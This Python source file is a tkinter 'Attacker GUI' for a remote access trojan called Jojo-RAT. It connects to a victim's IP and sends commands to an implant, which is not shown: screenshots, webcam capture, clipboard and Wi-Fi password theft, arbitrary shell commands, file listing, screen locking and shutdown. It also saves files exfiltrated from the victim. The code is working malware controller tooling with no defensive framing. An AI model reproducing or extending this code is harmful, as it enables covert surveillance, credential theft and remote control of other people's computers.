import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog
import socket
import time
import threading

BUFFER_SIZE = 4096
client_socket = None
connected = False

# Create main window
root = tk.Tk()
root.title("Jojo-RAT | Attacker GUI")
root.geometry("800x600")
root.configure(bg="black")

# Connection Frame
connect_frame = tk.Frame(root, bg="black")
connect_frame.pack(pady=10)

ip_label = tk.Label(connect_frame, text="Victim IP:", bg="black", fg="lime")
ip_label.grid(row=0, column=0)
ip_entry = tk.Entry(connect_frame, width=20, bg="black", fg="lime", insertbackground='lime')
ip_entry.grid(row=0, column=1)

port_label = tk.Label(connect_frame, text="Port:", bg="black", fg="lime")
port_label.grid(row=0, column=2)
port_entry = tk.Entry(connect_frame, width=10, bg="black", fg="lime", insertbackground='lime')
port_entry.grid(row=0, column=3)
port_entry.insert(0, "9999")

output_box = scrolledtext.ScrolledText(root, height=15, width=100, bg="black", fg="lime", insertbackground='lime')
output_box.pack(padx=10, pady=5)

def log_output(text):
    output_box.insert(tk.END, text + "\n")
    output_box.see(tk.END)

def connect_to_victim():
    global client_socket, connected
    try:
        ip = ip_entry.get()
        port = int(port_entry.get())
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((ip, port))
        connected = True
        log_output(f"[+] Connected to {ip}:{port}")
    except Exception as e:
        messagebox.showerror("Connection Failed", str(e))
        connected = False

def disconnect():
    global client_socket, connected
    if connected:
        try:
            client_socket.sendall(b"exit")
            client_socket.close()
            log_output("[-] Disconnected.")
        except:
            pass
        connected = False

def send_command(cmd):
    global client_socket
    if not connected:
        log_output("[!] Not connected.")
        return
    try:
        client_socket.sendall(cmd.encode())
        header = client_socket.recv(5)
        if header.startswith(b"FILE"):
            size_line = b""
            while not size_line.endswith(b"\n"):
                size_line += client_socket.recv(1)
            file_size = int(size_line.strip())
            received_data = b""
            while len(received_data) < file_size:
                part = client_socket.recv(BUFFER_SIZE)
                received_data += part
            filename = f"received_{int(time.time())}.jpg"
            with open(filename, "wb") as f:
                f.write(received_data)
            log_output(f"[+] File received and saved as {filename}")
        else:
            data = header + client_socket.recv(BUFFER_SIZE)
            log_output(data.decode(errors='ignore'))
    except Exception as e:
        log_output(f"[ERROR] {e}")

def run_shell():
    cmd = simpledialog.askstring("Shell Command", "Enter shell command:")
    if cmd:
        send_command(cmd)

def change_dir():
    folder = simpledialog.askstring("Change Directory", "Enter folder name:")
    if folder:
        send_command(f"cd {folder}")

def create_tab(name):
    tab = ttk.Frame(tabs)
    tabs.add(tab, text=name)

    # Watermark on each tab
    bg_label = tk.Label(tab, text="JOJO-RAT", font=("Courier", 60, "bold"), bg="gray20", fg="green")
    bg_label.place(relx=0.5, rely=0.5, anchor="center")

    def pulse_label(alpha=0.1, direction=1):
        alpha = max(0.1, min(1.0, alpha))
        intensity = int(255 * alpha)
        hex_green = f'#{intensity:02x}{255:02x}{intensity:02x}'
        bg_label.config(fg=hex_green)
        if alpha >= 1.0:
            direction = -1
        elif alpha <= 0.1:
            direction = 1
        tab.after(100, pulse_label, alpha + (direction * 0.05), direction)

    pulse_label()
    return tab

# Tabs
tabs = ttk.Notebook(root)
tabs.pack(expand=1, fill="both")

# System Tab
system_tab = create_tab("System")
tk.Button(system_tab, text="System Info", command=lambda: send_command("sys"), bg="black", fg="lime").pack(pady=5)
tk.Button(system_tab, text="Lock Screen", command=lambda: send_command("lock"), bg="black", fg="lime").pack(pady=5)
tk.Button(system_tab, text="Shutdown", command=lambda: send_command("shutdown"), bg="black", fg="lime").pack(pady=5)

# Surveillance Tab
surv_tab = create_tab("Surveillance")
tk.Button(surv_tab, text="Screenshot", command=lambda: send_command("screen"), bg="black", fg="lime").pack(pady=5)
tk.Button(surv_tab, text="Webcam", command=lambda: send_command("webcam"), bg="black", fg="lime").pack(pady=5)
tk.Button(surv_tab, text="Clipboard", command=lambda: send_command("clipboard"), bg="black", fg="lime").pack(pady=5)
tk.Button(surv_tab, text="Wi-Fi Passwords", command=lambda: send_command("wifi"), bg="black", fg="lime").pack(pady=5)

# Shell Tab
shell_tab = create_tab("Shell")
tk.Button(shell_tab, text="Run Shell Command", command=run_shell, bg="black", fg="lime").pack(pady=5)

# Files Tab
files_tab = create_tab("Files")
tk.Button(files_tab, text="List Directory", command=lambda: send_command("ls"), bg="black", fg="lime").pack(pady=5)
tk.Button(files_tab, text="Change Directory", command=change_dir, bg="black", fg="lime").pack(pady=5)

# Control Buttons
control_frame = tk.Frame(root, bg="black")
control_frame.pack(pady=10)
tk.Button(control_frame, text="Connect", command=connect_to_victim, bg="black", fg="lime").grid(row=0, column=0, padx=10)
tk.Button(control_frame, text="Disconnect", command=disconnect, bg="black", fg="lime").grid(row=0, column=1, padx=10)
tk.Button(control_frame, text="Exit", command=lambda: (disconnect(), root.destroy()), bg="black", fg="red").grid(row=0, column=2, padx=10)

root.mainloop()
